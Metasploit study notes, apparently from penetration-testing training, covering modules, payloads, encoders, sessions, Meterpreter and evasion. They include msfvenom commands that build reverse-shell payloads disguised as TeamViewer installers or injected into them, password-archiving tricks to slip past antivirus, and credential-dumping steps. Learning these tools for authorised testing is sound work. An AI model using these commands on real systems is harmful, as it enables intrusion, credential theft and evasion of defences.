# Introduction to Metasploit

## Overview
- **Metasploit Framework**: A Ruby-based penetration testing platform.
  - Includes tools for testing security vulnerabilities, network enumeration, exploitation, and post-exploitation.
  - Modular system: Exploits, payloads, and auxiliary tools are easily customizable.
- **Metasploit Pro**: A premium version with additional features:
  - GUI, Social Engineering, Task Chains, Nexpose Integration, and more.

![image](https://github.com/user-attachments/assets/4e8f050d-c88f-41b8-9cf9-58a522858697)


---

## Metasploit Framework Components
### 1. **msfconsole**
- The primary interface for Metasploit Framework.
- Features:
  - Access to all Metasploit options.
  - Tab-completion and command execution.
  - Console-based, stable, and feature-rich.
- Supports:
  - External commands like scanners, payload generators, and social engineering tools.
  - Jobs and sessions for multitasking during assessments.

### 2. **Modules**
- **Categories**:
  - `auxiliary`: Scanners and network enumeration tools.
  - `encoders`: Tools to encode payloads and evade detection.
  - `evasion`: Modules for bypassing security defenses.
  - `exploits`: Proof-of-concept exploits for vulnerabilities.
  - `nops`: Non-operational sleds for shellcode alignment.
  - `payloads`: Code delivered post-exploit.
  - `post`: Tools for post-exploitation activities.
- Path: `/usr/share/metasploit-framework/modules`

### 3. **Plugins**
- Provide additional functionality and automation.
- Examples:
  - `nexpose.rb`: Integration with Nexpose.
  - `pcap_log.rb`: Captures network packets.
  - Path: `/usr/share/metasploit-framework/plugins/`

### 4. **Scripts**
- Enhance Meterpreter capabilities and other utilities.
- Categories:
  - `meterpreter`: Advanced post-exploitation.
  - `resource`: Automates tasks.
  - Path: `/usr/share/metasploit-framework/scripts/`

### 5. **Tools**
- Command-line utilities for development, payload management, and reconnaissance.
- Path: `/usr/share/metasploit-framework/tools/`

---

## Metasploit Pro Features

| **Infiltration**         | **Data Collection**         | **Remediation**               |
|---------------------------|-----------------------------|-------------------------------|
| Manual Exploitation       | Import and Scan Data        | Bruteforce                    |
| Antivirus Evasion         | Discovery Scans             | Task Chains                   |
| IPS/IDS Evasion           | Meta-Modules                | Exploitation Workflow         |
| Proxy Pivot               | Nexpose Scan Integration    | Session Rerun                 |
| Post-Exploitation         |                             | Task Replay                   |
| Session Clean-up          |                             | Project Sonar Integration     |
| Credentials Reuse         |                             | Session Management            |
| Social Engineering        | Credential Management       | Credential Management         |
| Payload Generator         |                             | Team Collaboration            |
| Quick Pen-testing         |                             | Web Interface                 |
| VPN Pivoting              |                             | Backup and Restore            |
| Vulnerability Validation  |                             | Data Export                   |
| Phishing Wizard           |                             | Evidence Collection           |
| Web App Testing           |                             | Reporting                     |
| Persistent Sessions       |                             | Tagging Data                  |


---

## Key Directories
- **Base Files**: `/usr/share/metasploit-framework`
  - `data`: Functionality files.
  - `lib`: Core library files.
  - `documentation`: Technical details about the framework.
- **Modules, Plugins, Scripts, Tools**: Located within the `metasploit-framework` directory.

---

## Conclusion
Metasploit provides a powerful, modular platform for penetration testing, enabling users to exploit vulnerabilities and conduct post-exploitation efficiently. The **msfconsole** is the preferred interface, while plugins, scripts, and tools enhance functionality.


# Introduction to MSFconsole

## What is MSFconsole?
- MSFconsole is the primary interface for the Metasploit Framework.
- Provides centralized, command-line interaction with Metasploit features.
- Key features:
  - Tab-completion for commands.
  - Module management and updates.
  - Access to almost all Metasploit functionalities.

![image](https://github.com/user-attachments/assets/c7f33936-f6a2-4527-b9ef-289e0fec1be3)

---

## Launching MSFconsole

### Basic Command
```bash
msfconsole
```
- Displays the splash art and initializes the console.

### Quiet Mode
```bash
msfconsole -q
```
- Starts MSFconsole without displaying the banner.

### Help Command
- Use the following to view available commands:
```bash
help
```

# Metasploit Modules Overview

## What are Metasploit Modules?
- Prebuilt scripts for specific tasks (e.g., exploitation, payload delivery, post-exploitation).
- Modules include proof-of-concept (POC) exploits for vulnerabilities.
- **Note**: Failure of a module does not mean the vulnerability does not exist; it may require customization.

---

## Module Structure
Modules are structured as:
```bash
<type>/<os>/<service>/<name>
```

### Example
```bash
exploit/windows/ftp/scriptftp_list
```

### Tags
| **Type**        | **Description**                                                                |
|-----------------|--------------------------------------------------------------------------------|
| **Auxiliary**   | Scanning, fuzzing, sniffing, and admin capabilities. Extra assistance tools.   |
| **Encoders**    | Ensure payloads reach their destination intact.                                |
| **Exploits**    | Exploit vulnerabilities for payload delivery.                                  |
| **NOPs**        | (No Operation code) Maintain payload size consistency across exploits.         |
| **Payloads**    | Deliver code that runs remotely, often to establish a shell.                   |
| **Plugins**     | Extend msfconsole functionality for automation or additional features.         |
| **Post**        | Gather information, pivot, or escalate privileges after exploitation.          |

---

## Searching for Modules
- **Command**: `search`
- Use keywords and options to filter results:
  - **Example**:
    ```bash
    search type:exploit platform:windows cve:2021 rank:excellent
    ```

### Search Keywords
| **Keyword**     | **Description**                                               |
|------------------|---------------------------------------------------------------|
| `cve`           | Search by CVE ID                                              |
| `platform`      | Filter by platform (e.g., Windows, Linux)                      |
| `type`          | Module type (e.g., exploit, auxiliary, post)                  |
| `rank`          | Module reliability rank (e.g., excellent, normal)             |
| `name`          | Search by module name                                         |

---

## Using Modules
### Selecting a Module
- Use the **index number** or full path:
  ```bash
  use <module_number>
  ```
- Example:
  ```bash
  use exploit/windows/smb/ms17_010_psexec
  ```

### Viewing Module Options
- Command: `show options`
- Displays required and optional settings for the module.

### Setting Options
- **Temporary setting**:
  ```bash
  set <option_name> <value>
  ```
- **Global setting**:
  ```bash
  setg <option_name> <value>
  ```

---

## Example Workflow
1. **Search for a module**:
   ```bash
   search type:exploit platform:windows cve:2021 rank:excellent
   ```
2. **Select the module**:
   ```bash
   use exploit/windows/smb/ms17_010_psexec
   ```
3. **Set the target IP**:
   ```bash
   set RHOSTS <target_IP>
   ```
4. **Run the exploit**:
   ```bash
   run
   ```

---

## Conclusion
Metasploit modules simplify penetration testing by providing structured and automated tools. Understanding their structure and effective use is essential for successful security assessments.

# Metasploit Targets Overview

## What are Targets?
- Targets are specific operating system versions or configurations that an exploit module is designed to attack.
- They adapt the exploit to a particular OS or service pack.
- Use the `show targets` command within a selected exploit module to list available targets.

---

## Viewing Targets
- If no module is selected:
```bash
msf6 > show targets
[-] No exploit module selected.
```

- Example within a module:
```bash
msf6 exploit(windows/smb/ms17_010_psexec) > options

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                         rdlists/named_pipes.txt
   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 445                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                           no        The service display name
   SERVICE_NAME                                                   no        The service name
   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                            rmal read/write folder share
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

---

## Selecting a Target
- Use the `set target <index no.>` command to choose a specific target.
- Example:

```bash
msf6 exploit(windows/browser/ie_execcommand_uaf) > options

Module options (exploit/windows/browser/ie_execcommand_uaf):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   OBFUSCATE  false            no        Enable JavaScript obfuscation
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL for incoming connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                     no        The URI to use for this exploit (default is random)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   IE 7 on Windows XP SP3
   2   IE 8 on Windows XP SP3
   3   IE 7 on Windows Vista
   4   IE 8 on Windows Vista
   5   IE 8 on Windows 7
   6   IE 9 on Windows 7
```

```bash
msf6 exploit(windows/browser/ie_execcommand_uaf) > set target 6
target => 6
```

---

## Example Exploit: MS12-063 (Microsoft IE Use-After-Free)
- Target selection options:
  - IE 7 on Windows XP SP3
  - IE 8 on Windows XP SP3
  - IE 7 on Windows Vista
  - IE 8 on Windows Vista
  - IE 8 on Windows 7
  - IE 9 on Windows 7
- Use `info` command to understand module functionality and target versions.

---

## Automatic Target Detection
- Leaving the target as `Automatic` allows Metasploit to perform service detection before launching the attack.

---

## Target Types
- Targets vary by:
  - **Service Pack**: Specific OS updates.
  - **OS Version**: Different versions of Windows, Linux, etc.
  - **Language Version**: Language packs can shift memory addresses.
- Key factor: The return address used in the exploit (e.g., `jmp esp` or `pop/pop/ret`).

---

## Advanced Target Identification
- Obtain target binaries to identify suitable return addresses.
- Use `msfpescan` to analyze binaries and locate return addresses.

---

## Conclusion
Understanding targets helps refine exploit usage and improve success rates. Always audit target details to ensure accurate configurations.

#Payloads

# Introduction

A **Payload** in Metasploit refers to a module that assists the exploit module by (typically) returning a shell to the attacker. Payloads are sent alongside the exploit to bypass the standard functioning of the vulnerable service (exploit's job) and then execute on the target system, usually establishing a reverse connection to the attacker and providing initial access (payload's job).

Metasploit Framework has three main types of payload modules: **Singles**, **Stagers**, and **Stages**. The key difference lies in how they are structured and delivered.

## Payload Types

- **Singles**: Contain the entire exploit and the complete payload code. They are self-contained and more stable but can be larger in size.
- **Stagers**: Set up the network connection between the attacker and the victim. Designed to be small and reliable.
- **Stages**: Additional components downloaded by Stagers that provide advanced features like Meterpreter, VNC Injection, etc.

### Staged vs. Non-Staged Payloads

A **staged** payload separates functionality into multiple stages. The initial stage (`Stage0`) establishes the reverse connection and downloads the second stage (`Stage1`) to set up the shell.

A **non-staged** payload combines everything into a single execution.

Examples:
- **Staged**: `windows/meterpreter/reverse_tcp`
- **Non-Staged**: `windows/shell_reverse_tcp`

# Meterpreter

**Meterpreter** is an advanced payload that uses DLL injection to offer:
- Persistence in memory.
- Difficulty of detection through forensic techniques.
- Dynamic loading of scripts and plugins.

Common Meterpreter commands include:
- `getuid`: View the current user.
- `hashdump`: Extract system hashes.
- `screenshot`: Capture screenshots of the target.

# Searching for Payloads

Use the `show payloads` command to list all available payloads in Metasploit. Filter results using `grep` to find specific payloads.

```bash
msf6 > show payloads
msf6 > grep meterpreter grep reverse_tcp show payloads
```

## Usage Example

1. Select a payload:
   ```bash
   msf6 > set payload windows/x64/meterpreter/reverse_tcp
   ```
2. Configure the parameters:
   ```bash
   msf6 > set LHOST 10.10.14.15
   msf6 > set RHOSTS 10.10.10.40
   ```
3. Execute the exploit:
   ```bash
   msf6 > run
   ```

# Common Payload Types

| Payload                           | Description                                                              |
|------------------------------------|--------------------------------------------------------------------------|
|generic/custom	                     | Generic listener, multi-use                                              |
|generic/shell_bind_tcp	             | Generic listener, multi-use, normal shell, TCP connection binding        |
|generic/shell_reverse_tcp	         | Generic listener, multi-use, normal shell, reverse TCP connection        |
|windows/x64/exec	                   | Executes an arbitrary command (Windows x64)                              |
|windows/x64/loadlibrary	           | Loads an arbitrary x64 library path                                      |
|windows/x64/messagebox	             | Spawns a dialog via MessageBox using a customizable title, text & icon   |
|windows/x64/shell_reverse_tcp	     | Normal shell, single payload, reverse TCP connection                     |
|windows/x64/shell/reverse_tcp	     | Normal shell, stager + stage, reverse TCP connection                     |
|windows/x64/shell/bind_ipv6_tcp	   | Normal shell, stager + stage, IPv6 Bind TCP stager                       |
|windows/x64/meterpreter/$	         | Meterpreter payload + varieties above                                    |
|windows/x64/powershell/$	           | Interactive PowerShell sessions + varieties above                        |
|windows/x64/vncinject/$	VNC Server | (Reflective Injection) + varieties above                                 |

---

Explore more advanced payloads such as Empire and Cobalt Strike for professional assessments.


# Encoders in Metasploit

Over the 15 years of existence of the Metasploit Framework, Encoders have assisted with making payloads compatible with different processor architectures while at the same time helping with antivirus evasion. Encoders come into play with the role of changing the payload to run on different operating systems and architectures. These architectures include:

- **x64**
- **x86**
- **sparc**
- **ppc**
- **mips**

They are also needed to remove hexadecimal opcodes known as bad characters from the payload. Not only that but encoding the payload in different formats could help with the AV detection as mentioned above. However, the use of encoders strictly for AV evasion has diminished over time, as IPS/IDS manufacturers have improved how their protection software deals with signatures in malware and viruses.

### Shikata Ga Nai Encoding

Shikata Ga Nai (SGN) is one of the most utilized Encoding schemes today because it is so hard to detect that payloads encoded through its mechanism are not universally undetectable anymore. Far from it. The name (仕方がない) means _It cannot be helped_ or _Nothing can be done about it_, and rightfully so if we were reading this a few years ago. However, there are other methodologies we will explore to evade protection systems. 

### Selecting an Encoder

Before 2015, the Metasploit Framework had different submodules that took care of payloads and encoders. They were packed separately from the `msfconsole` script and were called **msfpayload** and **msfencode**.

If we wanted to create our custom payload, we could do so through `msfpayload`, but we would have to encode it according to the target OS architecture using `msfencode` afterward. A pipe would take the output from one command and feed it into the next, which would generate an encoded payload, ready to be sent and run on the target machine.

#### Example:
```bash
msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```

After 2015, updates to these scripts combined them into the `msfvenom` tool, which handles payload generation and encoding.

#### Generating Payload - Without Encoding
```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```

#### Generating Payload - With Encoding
```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

### Using `msfvenom` with Multiple Encoders

One better option would be to try running the payload through multiple iterations of the same Encoding scheme:

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o TeamViewerInstall.exe
```

The `-i` flag specifies the number of iterations. However, this does not guarantee evasion against modern AV systems.

### Compatible Encoders

To check which encoders are compatible with a specific exploit or payload, use the `show encoders` command in `msfconsole`.

#### Example:
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders
```

This command displays a list of compatible encoders for the selected module.

---

Encoders in Metasploit are useful for compatibility and some evasion scenarios, but modern AV systems have improved their detection capabilities. For advanced evasion techniques, alternative tools and methods are required.



# Databases in Metasploit Framework

Databases in `msfconsole` are used to keep track of your results. During complex assessments of machines or entire networks, managing results, entry points, detected issues, discovered credentials, etc., can become overwhelming. Databases help to organize and manage this data efficiently.

Metasploit Framework supports the PostgreSQL database system, enabling quick access to scan results and seamless import/export capabilities with third-party tools.

---

## Setting up the Database

1. **Check PostgreSQL Status**  
   Ensure the PostgreSQL server is running on the host machine:

   ```bash
   sudo service postgresql status
   ```

2. **Start PostgreSQL**  
   ```bash
   sudo systemctl start postgresql
   ```

3. **Initialize the Database**  
   Run the following to set up the MSF database:
   ```bash
   sudo msfdb init
   ```

4. **Verify Database Status**  
   ```bash
   sudo msfdb status
   ```

5. **Connect the Database to Metasploit**  
   ```bash
   sudo msfdb run
   ```

6. **Reinitialize Database (if needed)**  
   Use these commands if reinitialization is required:
   ```bash
   msfdb reinit
   cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
   sudo service postgresql restart
   msfconsole -q
   ```

---

## Database Commands in `msfconsole`

To interact with the database, `msfconsole` offers integrated commands. Use `help database` for an overview.

### Common Commands
| Command             | Description                                         |
|---------------------|-----------------------------------------------------|
| `db_connect`        | Connect to an existing database                     |
| `db_disconnect`     | Disconnect from the current database instance       |
| `db_export`         | Export database contents                            |
| `db_import`         | Import scan result files                            |
| `db_nmap`           | Execute `nmap` and record results                   |
| `db_status`         | Show database connection status                     |
| `hosts`             | List all hosts in the database                      |
| `services`          | List all services in the database                   |
| `vulns`             | List vulnerabilities                               |
| `workspace`         | Manage workspaces                                  |

---

## Workspaces

Workspaces organize database entries into isolated sections based on criteria such as IP range, subnet, or domain.

### Managing Workspaces
- **List Workspaces**  
  ```bash
  workspace
  ```
- **Create Workspace**  
  ```bash
  workspace -a <workspace_name>
  ```
- **Switch Workspace**  
  ```bash
  workspace <workspace_name>
  ```
- **Delete Workspace**  
  ```bash
  workspace -d <workspace_name>
  ```

---

## Importing Scan Results

Import results from tools like Nmap into the database to enrich your workspace:

1. Save the scan as an XML file:
   ```bash
   nmap -oX <filename>.xml <target>
   ```

2. Import the scan results:
   ```bash
   db_import <filename>.xml
   ```

3. Verify imported results using:
   ```bash
   hosts
   services
   ```

---

## Running Nmap from `msfconsole`

Run Nmap directly in Metasploit using the `db_nmap` command. Example:

```bash
db_nmap -sV -sS <target>
```

---

## Data Backup

Export the database contents for backup using:
```bash
db_export -f xml <filename>.xml
```

---

## Additional Commands

### Hosts
Displays host information stored in the database:
```bash
hosts -h
```

### Services
Displays service information related to hosts:
```bash
services -h
```

### Credentials
Manage gathered credentials:
```bash
creds -h
```

### Loot
Displays or manages gathered loot (e.g., hash dumps):
```bash
loot -h
```

---

## Conclusion

The database functionality in Metasploit simplifies organizing and managing information during penetration tests. With features like workspaces, scan imports, and credentials management, it streamlines the assessment process while ensuring data remains accessible and well-organized.


# Sessions in Metasploit

MSFconsole can manage multiple modules simultaneously. This provides flexibility by allowing the user to run and manage various exploits and auxiliary modules concurrently using **Sessions**. Each session creates a dedicated control interface for the deployed modules, enabling seamless interaction.

## Managing Sessions

### Backgrounding Sessions
While running exploits or auxiliary modules, sessions can be backgrounded. This allows the user to keep the connection with the target host active while launching new modules.

- Use **`[CTRL] + [Z]`** or type the `background` command to background a session.
- Backgrounding a session brings you back to the `msfconsole` prompt while maintaining the communication channel.

### Listing Active Sessions
The `sessions` command displays the list of all active sessions.

```bash
msf6 exploit(windows/smb/psexec_psh) > sessions

Active sessions
===============

  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -> 10.10.10.205:50501 (10.10.10.205)
```

### Interacting with a Session
Use `sessions -i [no.]` to interact with a specific session.

```bash
msf6 exploit(windows/smb/psexec_psh) > sessions -i 1
[*] Starting interaction with 1...

meterpreter >
```

This allows additional modules to be run on an already exploited system with a stable communication channel.

### Switching Between Sessions
You can background one session and interact with another by specifying the session ID.

---

## Jobs in Metasploit

### Backgrounding Exploits as Jobs
When running exploits, you can run them as background jobs to keep them active without blocking the console. Use the `exploit -j` command to run an exploit as a job.

```bash
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.34:4444
```

### Listing and Managing Jobs
- Use `jobs -l` to list all running jobs.
- Use `jobs -k [index no.]` to kill a specific job.
- Use `jobs -K` to terminate all running jobs.

```bash
msf6 exploit(multi/handler) > jobs -l

Jobs
====

 Id  Name                    Payload                    Payload opts
 --  ----                    -------                    ------------
 0   Exploit: multi/handler  generic/shell_reverse_tcp  tcp://10.10.14.34:4444
```

### Help Menu for Jobs
The `jobs -h` command displays the help menu for job management.

```bash
msf6 exploit(multi/handler) > jobs -h
Usage: jobs [options]

Active job manipulation and interaction.

OPTIONS:

    -K        Terminate all running jobs.
    -l        List all running jobs.
    -k <opt>  Terminate jobs by job ID and/or range.
    -h        Help banner.
    -v        Print more detailed info. Use with -i and -l.
```

---

## Additional Commands

### Running Post-Exploitation Modules
Post-exploitation modules can be run on an active session. After backgrounding a session, use `show options` within the selected module to link it to the session by specifying the session ID.

### Viewing Exploit Help Menu
To learn more about exploit options, use `exploit -h`.

```bash
msf6 exploit(multi/handler) > exploit -h
Usage: exploit [options]

OPTIONS:

    -j        Run in the context of a job.
    -e <opt>  Specify payload encoder.
    -f        Force exploit to run.
    -h        Help banner.
```

---

With sessions and jobs, Metasploit provides efficient management tools for running and switching between multiple tasks and exploits during an assessment. This flexibility is invaluable for larger-scale penetration tests or complex engagements.



# Meterpreter in Metasploit

## Overview
The Meterpreter Payload is a specific type of multi-faceted, extensible Payload that uses DLL injection to ensure the connection to the victim host is stable and difficult to detect using simple checks and can be configured to be persistent across reboots or system changes. Furthermore, Meterpreter resides entirely in the memory of the remote host and leaves no traces on the hard drive, making it difficult to detect with conventional forensic techniques.

It is dubbed the swiss army knife of pentesting, and for a good reason. The purpose of Meterpreter is to specifically improve our post-exploitation procedures, offering us a hand-picked set of relevant tools for more straightforward enumeration of the target host from the inside. It can help us find various privilege escalation techniques, AV evasion techniques, further vulnerability research, provide persistent access, pivot, etc.

## Key Features
- **Stealthy**: Meterpreter resides entirely in memory and writes nothing to the disk. No new processes are created, as Meterpreter injects itself into a compromised process. Additionally, communications are encrypted using AES.
- **Powerful**: Uses a channelized communication system and allows spawning of host-OS shells inside the Meterpreter stage.
- **Extensible**: Features can be augmented at runtime and loaded over the network, allowing for constant updates and customizations.

## Using Meterpreter
To run Meterpreter, you need to select an appropriate payload and exploit, ensuring compatibility with the target system. Once executed, Meterpreter provides a shell with extended functionalities.

### Example of Running Meterpreter
```bash
msf6 > db_nmap -sV -p- -T5 -A 10.10.10.15
msf6 > use exploit/windows/iis/iis_webdav_upload_asp
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOST 10.10.10.15
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set LHOST tun0
msf6 exploit(windows/iis/iis_webdav_upload_asp) > run
```

### Interacting with Meterpreter
Once a Meterpreter session is active:
```bash
meterpreter > help
meterpreter > getuid
meterpreter > ps
```

### Example of Privilege Escalation
Use the `local_exploit_suggester` module to find vulnerabilities:
```bash
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
msf6 post(multi/recon/local_exploit_suggester) > run
```

If a suitable exploit is found:
```bash
msf6 > use exploit/windows/local/ms15_051_client_copy_image
msf6 exploit(windows/local/ms15_051_client_copy_image) > set SESSION 1
msf6 exploit(windows/local/ms15_051_client_copy_image) > run
```

## Post-Exploitation
Meterpreter provides various post-exploitation commands:
- **Hash Dumping**:
```bash
meterpreter > hashdump
```
- **Dumping LSA Secrets**:
```bash
meterpreter > lsa_dump_secrets
```

These commands allow you to retrieve sensitive data, impersonate users, or pivot further into the network.

---

Meterpreter's versatility and power make it an essential tool in any penetration tester's arsenal.

#Extra


# Writing and Importing Modules

To install any new Metasploit modules which have already been ported over by other users, one can choose to update their msfconsole from the terminal, which will ensure that all newest exploits, auxiliaries, and features will be installed in the latest version of msfconsole. As long as the ported modules have been pushed into the main Metasploit-framework branch on GitHub, we should be updated with the latest modules.

However, if we need only a specific module and do not want to perform a full upgrade, we can download that module and install it manually. We will focus on searching ExploitDB for readily available Metasploit modules, which we can directly import into our version of msfconsole locally.

## ExploitDB Search

ExploitDB is a great choice when searching for a custom exploit. We can use tags to search through the different exploitation scenarios for each available script. One of these tags is Metasploit Framework (MSF), which, if selected, will display only scripts that are also available in Metasploit module format. These can be directly downloaded from ExploitDB and installed in our local Metasploit Framework directory, from where they can be searched and called from within the msfconsole.

[ExploitDB - Metasploit Modules](https://www.exploit-db.com/?tag=3)

Example: Searching for a Nagios3 exploit with command injection.

```bash
msf6 > search nagios
```

If the module is not found, search ExploitDB or use the CLI tool `searchsploit`.

```bash
searchsploit nagios3
```

Filter results:

```bash
searchsploit -t Nagios3 --exclude=".py"
```

## Installing a Module Manually

Download the `.rb` file and place it in the correct directory. Ensure the folder structure matches the Metasploit Framework directory:

```bash
cp ~/Downloads/module.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/
```

Reload modules in `msfconsole`:

```bash
msf6 > reload_all
```

Then use the module:

```bash
msf6 > use exploit/unix/webapp/nagios3_command_injection
```

## Porting Scripts into Metasploit Modules

### Adapting Existing Scripts

To adapt a Python or PHP exploit to Metasploit, knowledge of Ruby is necessary. Start with boilerplate code from existing modules and modify as needed.

```ruby
##
# This module requires Metasploit: https://metasploit.com/download
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Custom Module",
      'Description'    => %q{Description of the exploit},
      'License'        => MSF_LICENSE,
      'Author'         => ['Author Name'],
      'References'     => [['CVE', 'xxxx-xxxx']],
      'Platform'       => 'php',
      'Targets'        => [['Target Name', {}]],
      'DefaultTarget'  => 0))
  end
end
```

### Resources for Learning

- [Metasploit Documentation](https://docs.metasploit.com)
- Metasploit: A Penetration Tester's Guide by No Starch Press
- Rapid7 Blog Posts


# Introduction to MSFVenom

MSFVenom is the successor of MSFPayload and MSFEncode, two stand-alone scripts that used to work in conjunction with msfconsole to provide users with highly customizable and hard-to-detect payloads for their exploits.

MSFVenom is the result of the marriage between these two tools. Before this tool, we had to pipe (|) the result from MSFPayload, which was used to generate shellcode for a specific processor architecture and OS release, into MSFEncode, which contained multiple encoding schemes used both for removing bad characters from shellcode (this could sometimes cause instability during the runtime), and for evading older Anti-Virus (AV) and endpoint Intrusion Prevention / Intrusion Detection (IPS/IDS) software.

...

### MSF - Local Privilege Escalation

```bash
msf6 exploit(multi/handler) > search kitrap0d

Matching Modules
================

   #  Name                                     Disclosure Date  Rank   Check  Description
   -  ----                                     ---------------  ----   -----  -----------
   0  exploit/windows/local/ms10_015_kitrap0d  2010-01-19       great  Yes    Windows SYSTEM Escalation via KiTrap0D
...

[*] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 4 opened (10.10.14.5:1338 -> 10.10.10.5:49162) at 2020-08-28 17:15:56 +0000

meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```


# Firewall and IDS/IPS Evasion

## Understanding Defenses

To better learn how we can efficiently and quietly attack a target, we first need to understand better how that target is defended. We are introduced to two new terms:

- **Endpoint protection**
- **Perimeter protection**

### Endpoint Protection
Endpoint protection refers to any localized device or service whose sole purpose is to protect a single host on the network. The host can be a personal computer, a corporate workstation, or a server in a network's De-Militarized Zone (DMZ).

Examples include software packs like Antivirus Protection, Antimalware Protection (bloatware, spyware, adware, ransomware), Firewall, and Anti-DDOS. Familiar names are Avast, Nod32, Malwarebytes, and BitDefender.

### Perimeter Protection
Perimeter protection usually comes in physical or virtualized devices on the network perimeter edge. These edge devices themselves provide access inside of the network from the outside, in other terms, from public to private.

Between these two zones, there is often a third one, called the **De-Militarized Zone (DMZ)**. This is a virtual space where public-facing servers are housed. These servers interact with public clients while being managed and updated from the private internal network.

---

## Security Policies
Security policies are the backbone of any well-maintained security posture of a network. They function similarly to Access Control Lists (ACLs) and dictate how traffic or files are handled within a network boundary.

### Types of Policies:
- **Network Traffic Policies**
- **Application Policies**
- **User Access Control Policies**
- **File Management Policies**
- **DDoS Protection Policies**

### Detection Methods
The following are ways to match events with security policy rules:

1. **Signature-based Detection**: Matches packets against pre-built attack patterns.
2. **Heuristic/Statistical Anomaly Detection**: Monitors behavioral deviations from a baseline.
3. **Stateful Protocol Analysis Detection**: Compares traffic to known definitions of non-malicious activity.
4. **Live-monitoring and Alerting (SOC-based)**: A Security Operations Center monitors live feeds for threats.

---

## Evasion Techniques
Modern Antivirus (AV) and IDS/IPS products rely heavily on signature-based detection, which identifies malicious patterns in software or traffic. To bypass these:

### Key Techniques:
1. **Encrypted Payloads**:
   MSF6 can tunnel AES-encrypted communication between the attacker and victim.
2. **Executable Templates**:
   Use templates like legitimate software to embed payloads, reducing detection.
3. **Archiving with Passwords**:
   Compressing and password-protecting files can bypass some antivirus scanners.
4. **Packers**:
   Tools like UPX or Themida compress executables, obfuscating the payload.

---

## Generating Backdoored Executables with `msfvenom`

To embed a payload into a legitimate executable, use:

```bash
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```

The `-k` flag ensures the legitimate executable continues to run after launching the payload.

---

## Archiving Payloads

1. Archive the payload with a password:
   ```bash
   rar a ~/test.rar -p ~/test.js
   ```
2. Remove the file extension:
   ```bash
   mv test.rar test
   ```

3. Archive the resulting file again with another password:
   ```bash
   rar a test2.rar -p test
   ```

This multi-layer archiving can bypass many antivirus scanners.

---

## Packers

Packers compress and obfuscate executables, making detection harder. Examples include UPX, Themida, and Enigma Protector.

---

## A Note on Evasion

Evasion is a vast topic and cannot be fully covered here. Practice evasion skills with older HTB machines or virtual environments with outdated antivirus software.
